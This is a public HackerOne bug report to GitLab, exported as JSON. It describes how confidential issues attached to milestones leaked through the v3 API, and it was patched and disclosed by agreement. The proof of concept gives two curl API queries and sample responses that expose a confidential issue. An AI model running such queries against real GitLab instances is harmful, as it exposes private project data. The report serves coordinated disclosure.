{"id":134300,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMzQzMDA=","url":"https://hackerone.com/reports/134300","title":"Confidential issues leaked in public projects when attached to milestone","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2016-04-25T00:37:22.414Z","submitted_at":"2016-04-25T00:37:22.414Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"jobert","url":"/jobert","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":264,"url":"https://hackerone.com/gitlab","handle":"gitlab","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/264/8dd359f496ba6c5b97c5126dc86924a00fd7ef26_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/264/8dd359f496ba6c5b97c5126dc86924a00fd7ef26_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"GitLab","twitter_handle":"gitlab","website":"https://about.gitlab.com","about":"A single application for the entire software development lifecycle."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2016-05-03T00:59:28.825Z","bug_reporter_agreed_on_going_public_at":"2016-05-03T00:55:17.188Z","team_member_agreed_on_going_public_at":"2016-05-03T00:59:28.771Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"# Vulnerability details\nWhen a confidential issue in a public or internal project is attached to a milestone, it is exposed through the GitLab API.\n\n# Proof of concept\nAs a victim, create a new public or internal project. Lets state that the project has ID 1. Create a milestone for this project. After that, create a confidential issue for this project and attach it to the milestone. In this proof of concept, we're going to extract the title and description of the confidential issue. As an attacker, start by fetching all the milestones for the project:\n\n```bash\ncurl --header \"PRIVATE-TOKEN: XXXXXXXXXXXXXX\" \"http://gitlab-instance/api/v3/projects/1/milestones\"\n```\n\nThe command will respond with all milestones. In this example, it returns the milestone that was created by the victim:\n\n```json\n[\n  {\n    \"id\":3,\n    \"iid\":1,\n    \"project_id\":1,\n    \"title\":\"Milestone title\",\n    \"description\":\"Milestone description\",\n    \"state\":\"active\",\n    \"created_at\":\"2016-04-22T01:15:37.902Z\",\n    \"updated_at\":\"2016-04-22T01:15:37.902Z\",\n    \"due_date\":null\n  }\n]\n```\n\nFor each unique milestone ID that is returned in this response, execute the following command:\n\n```bash\ncurl --header \"PRIVATE-TOKEN: XXXXXXXXXXXXXX\" \"http://gitlab-instance/api/v3/projects/1/milestones/3/issues\"\n```\n\nThe response if this request will contain all issues, including **confidential** issues:\n\n```json\n[\n  {\n    \"id\":13,\n    \"iid\":1,\n    \"project_id\":1,\n    \"title\":\"Some confidential issue\",\n    \"description\":\"This is some super confidential information.\",\n    \"state\":\"opened\",\n    \"created_at\":\"2016-04-22T00:59:38.877Z\",\n    \"updated_at\":\"2016-04-25T00:10:16.711Z\",\n    \"labels\":[],\n    \"milestone\": {\n      \"id\":3,\n      \"iid\":1,\n      \"project_id\":1,\n      \"title\":\"Milestone title\",\n      \"description\":\"Milestone description\",\n      \"state\":\"active\",\n      \"created_at\":\"2016-04-22T01:15:37.902Z\",\n      \"updated_at\":\"2016-04-22T01:15:37.902Z\",\n      \"due_date\":null\n    },\n    \"assignee\":null,\n    \"author\": {\n      \"name\":\"John Doe\",\n      \"username\":\"john\",\n      \"id\":1,\n      \"state\":\"active\",\n      \"avatar_url\":\"http://www.gravatar.com/avatar/e64c7d89f26bd1972efa854d13d7dd61?s=80\\u0026d=identicon\",\n      \"web_url\":\"http://gitlab-instance/u/john\"\n    }\n  }\n]\n```\n\n# Impact\nConfidential issues may contain information that shouldn't be known to the outside. An example could be security issues that are tracked in GitLab for open source projects, like `gitlab-org/gitlab-ce` or `gitlab-org/gitlab-ee`. It may also contain private API tokens that need to be tracked in a task (I wouldn't recommend it, but it happens).","weakness":{"id":18,"name":"Information Disclosure"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2016-06-02T00:55:21.256Z","allow_singular_disclosure_after":-169130601.8532532,"singular_disclosure_allowed":true,"vote_count":4,"voters":["eveeez","spetr0x","dyabla","cryptosector"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":925363,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@jobert Thank you! https://gitlab.com/gitlab-org/gitlab-ce/issues/15579","automated_response":false,"created_at":"2016-04-25T00:42:33.177Z","updated_at":"2016-04-25T00:42:33.177Z","actor":{"username":"rspeicher","cleared":false,"url":"/rspeicher","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/070/800/771703800f32dcb0c5413919f04f19305041dd58_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":925365,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","automated_response":false,"created_at":"2016-04-25T00:49:11.312Z","updated_at":"2016-04-25T00:49:11.312Z","actor":{"username":"rspeicher","cleared":false,"url":"/rspeicher","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/070/800/771703800f32dcb0c5413919f04f19305041dd58_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":937746,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"@jobert The patches that include a fix for this issue [have been released](https://about.gitlab.com/2016/05/02/cve-2016-4340-patches/) and the [acknowledgements page](https://about.gitlab.com/vulnerability-acknowledgements/) has been updated.\n\nFeel free to request public disclosure for this report if you'd like.\n\nThank you again!","automated_response":false,"created_at":"2016-05-03T00:52:23.519Z","updated_at":"2016-05-03T00:52:23.519Z","actor":{"username":"rspeicher","cleared":false,"url":"/rspeicher","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/070/800/771703800f32dcb0c5413919f04f19305041dd58_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"jobert","url":"/jobert"},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":937769,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2016-05-03T00:55:17.217Z","updated_at":"2016-05-03T00:55:17.217Z","first_to_agree":true,"actor":{"username":"jobert","cleared":true,"url":"/jobert","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":937782,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2016-05-03T00:59:28.791Z","updated_at":"2016-05-03T00:59:28.791Z","actor":{"username":"rspeicher","cleared":false,"url":"/rspeicher","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/070/800/771703800f32dcb0c5413919f04f19305041dd58_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":937783,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2016-05-03T00:59:28.843Z","updated_at":"2016-05-03T00:59:28.843Z","actor":{"username":"rspeicher","cleared":false,"url":"/rspeicher","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/070/800/771703800f32dcb0c5413919f04f19305041dd58_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}